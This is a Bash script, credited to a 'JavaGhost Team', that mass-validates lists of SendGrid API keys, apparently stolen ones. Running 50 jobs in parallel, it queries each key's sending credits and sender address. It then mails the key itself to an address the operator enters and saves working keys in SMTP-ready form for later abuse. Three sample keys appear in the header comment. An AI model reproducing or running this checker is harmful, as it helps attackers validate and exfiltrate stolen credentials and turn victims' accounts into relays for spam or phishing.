# !/bin/bash
# SendGrid Apikey Checker By : ./LazyBoy - JavaGhost Team
# Contact : https://fb.me/n00b.me

# READ THIS FOR INFORMATION VALID LIST
: '
Example list for this tools

apikey|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
someuser|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
randomuser|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
'

# color(bold)
red='\e[1;31m'
green='\e[1;32m'
yellow='\e[1;33m'
blue='\e[1;34m'
magenta='\e[1;35m'
cyan='\e[1;36m'
white='\e[1;37m'

# useragent
useragent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.88 Safari/537.36"

# banner
echo -e "\t\tJavaGhost SendGrid Apikey Checker ${red}+ ${white}Auto Check Send\n"

# ask file + ask receiver
echo -e "${white}[ ${red}INFO ${white}] ${blue}- ${white}Just put list with delimiter like this ${blue}: ${green}USER|SG.XXXX${white}"
read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] Input your list SG apikey    \e[1;34m: \e[1;32m' ask_file
if [[ ! -e $ask_file ]]; then
    echo -e "${white}[ ${red}! ${white}] ${red}Error file not found in ur directory${white}"
    exit
else
	read -p $'\e[1;37m[ \e[1;32m? \e[1;37m] Input email for receive test \e[1;34m: \e[1;32m' ask_receiver
	if [[ -z $ask_receiver ]]; then
		echo -e "${white}[ ${red}ERROR ${white}] ${blue}- ${red}Input email for receive!${white}"
		exit
	else
		echo ""
	fi
fi

# get info apikey sendgrid from api.sendgrid.com
function get_info(){
	curl -s "https://api.sendgrid.com/v3/user/$1" \
			-H "User-Agent: ${useragent}" \
			-H "Authorization: Bearer $(echo "${apikey_sg}" | cut -d "|" -f2)"
}

# start checking apikey + auto cek send
function checking_sg(){
	apikey_limit=$(get_info credits | grep -Po 'total":\K([0-9]*)' | sed ':a;s/\B[0-9]\{3\}\>/.&/;ta')
	apikey_from_mail=$(get_info email | grep -oP '"email":"\K[^"]+')
	apikey_used=$(get_info credits | grep -Po 'used":\K([0-9]*)' | sed ':a;s/\B[0-9]\{3\}\>/.&/;ta')

	if [[ $(get_info credits) =~ "total" ]]; then
		check_send=$(curl --connect-timeout 25 -m 25 -so /dev/null -w '%{http_code}' --url 'https://api.sendgrid.com/v3/mail/send' \
							-H 'User-Agent: $useragent' \
							-H 'Authorization: Bearer '$(echo "${apikey_sg}" | cut -d "|" -f2)'' \
							-H 'Content-Type: application/json' \
							-d '{"personalizations": [{"to": [{"email": "'$ask_receiver'"}]}],"from": {"email": "'$apikey_from_mail'"},"subject": "SendGrid Apikey - Work!","content": [{"type": "text/plain", "value": "'$(echo $apikey_sg | cut -d "|" -f2)'"}]}')

		if [[ $check_send == "202" ]]; then
			echo -e "${white}[ ${green}GOOD ${white}] ${blue}- ${green}$(echo "${apikey_sg}" | cut -d "|" -f2 | cut -d "." -f1,2) ${blue}- ${white}LIMIT ${blue}: ${green}${apikey_limit} ${blue}- ${white}USED ${blue}: ${green}${apikey_used} ${blue}- ${white}FM ${blue}: ${green}$apikey_from_mail ${white}- ${yellow}SUCCESS SEND${white}"
			echo "smtp.sendgrid.com|587|${apikey_sg}|$apikey_from_mail - $apikey_limit:$apikey_used" >> sendgrid_can_send.txt
		else
			echo -e "${white}[ ${green}GOOD ${white}] ${blue}- ${green}$(echo "${apikey_sg}" | cut -d "|" -f2 | cut -d "." -f1,2) ${blue}- ${white}LIMIT ${blue}: ${green}${apikey_limit} ${blue}- ${white}USED ${blue}: ${green}${apikey_used} ${blue}- ${white}FM ${blue}: ${green}$apikey_from_mail ${white}- ${red}FAILED SEND${white}"
			echo "smtp.sendgrid.com|587|${apikey_sg}|$apikey_from_mail - $apikey_limit:$apikey_used" >> sendgrid_cant_send.txt
		fi
	else
		echo -e "${white}[ ${red}BAD ${white}] ${blue}- ${red}$(echo "${apikey_sg}" | cut -d "|" -f2)${white}"
	fi
}

# multithreading
limit="50"
for apikey_sg in $(cat $ask_file); do
	checking_sg "$apikey_sg" &
	while (( $(jobs | wc -l) >= $limit )); do
		sleep 0.1s
		jobs > /dev/null
	done
done
wait

echo -e "\n${white}[ ${green}+ ${white}] ${white}Total SendGrid Success Send ${blue}: ${green}$(< sendgrid_can_send.txt wc -l)${white}"
echo -e "${white}[ ${red}- ${white}] ${white}Total SendGrid Failed Send  ${blue}: ${red}$(< sendgrid_cant_send.txt wc -l)${white}"
echo -e "${white}[ ${red}NOTE ${white}] ${blue}- ${red}If you got response ${yellow}SUCCESS SEND${red} but you not receive in your email ? maybe it's a bounce.${white}"